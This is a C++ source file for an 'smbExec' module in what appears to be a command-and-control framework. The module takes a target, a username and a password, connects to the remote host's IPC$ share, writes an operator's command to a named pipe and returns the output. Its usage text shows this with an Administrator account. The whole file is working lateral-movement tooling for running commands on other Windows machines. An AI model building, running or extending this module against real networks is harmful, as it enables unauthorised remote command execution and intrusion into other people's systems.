#include "SmbExec.hpp"
#include "Common.hpp"

#include <cstring>

using namespace std;

constexpr std::string_view moduleName = "smbExec";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32
__declspec(dllexport) SmbExec* SmbExecConstructor()
{
    return new SmbExec();
}
#else
__attribute__((visibility("default"))) SmbExec* SmbExecConstructor()
{
    return new SmbExec();
}
#endif

SmbExec::SmbExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

SmbExec::~SmbExec()
{
}

std::string SmbExec::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "smbExec Module:\n";
    info += "Execute commands on a remote host via SMB without dropping binaries.\n";
    info += "Usage: smbExec <target> <user> <password> <command>\n";
    info += "Example: smbExec 192.168.1.10 Administrator Passw0rd \"whoami\"\n";
#endif
    return info;
}

int SmbExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
    if (splitedCmd.size() >= 5 )
    {
        std::string target = splitedCmd[1];
        std::string user = splitedCmd[2];
        std::string pass = splitedCmd[3];
        std::string command;
        for(size_t i=4;i<splitedCmd.size();++i){
            if(!command.empty()) command += " ";
            command += splitedCmd[i];
        }

        std::string cmd = target;
        cmd += '\0';
        cmd += user;
        cmd += '\0';
        cmd += pass;

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_cmd(cmd);
        c2Message.set_data(command.data(), command.size());
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }
#endif
    return 0;
}

int SmbExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());

    std::string result;
#ifdef _WIN32
    std::string cmd = c2Message.cmd();
    std::vector<std::string> parts;
    std::string delim; delim += '\0';
    splitList(cmd, delim, parts);

    std::string target, user, pass;
    if(parts.size() >= 3){
        target = parts[0];
        user = parts[1];
        pass = parts[2];
    }

    NETRESOURCEA nr; ZeroMemory(&nr, sizeof(nr));
    std::string remote = "\\" + std::string("\\") + target + "\\IPC$";
    nr.dwType = RESOURCETYPE_DISK;
    nr.lpRemoteName = const_cast<LPSTR>(remote.c_str());

    DWORD ret = WNetAddConnection2A(&nr, pass.c_str(), user.c_str(), 0);
    if(ret != NO_ERROR){
        result += "WNetAddConnection2A failed: ";
        result += std::to_string(ret);
        result += "\n";
    }else{
        std::string pipePath = "\\\\" + target + "\\pipe\\smbexec_cmd";
        HANDLE hPipe = CreateFileA(pipePath.c_str(), GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if(hPipe == INVALID_HANDLE_VALUE){
            result += "CreateFileA failed: ";
            result += std::to_string(GetLastError());
            result += "\n";
        }else{
            std::string command = c2Message.data();
            command += "\r\n";
            DWORD written = 0;
            if(!WriteFile(hPipe, command.c_str(), command.size(), &written, NULL)){
                result += "WriteFile failed: ";
                result += std::to_string(GetLastError());
                result += "\n";
            }else{
                char buffer[512];
                DWORD read = 0;
                while(ReadFile(hPipe, buffer, sizeof(buffer)-1, &read, NULL) && read>0){
                    buffer[read] = 0;
                    result += buffer;
                    if(read < sizeof(buffer)-1) break;
                }
            }
            CloseHandle(hPipe);
        }
        WNetCancelConnection2A(remote.c_str(), 0, TRUE);
    }
#else
    result += "SmbExec don't work in linux.\n";
#endif

    c2RetMessage.set_returnvalue(result);
    return 0;
}

int SmbExec::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0){
        errorMsg = "SmbExec failed";
    }
#endif
    return 0;
}
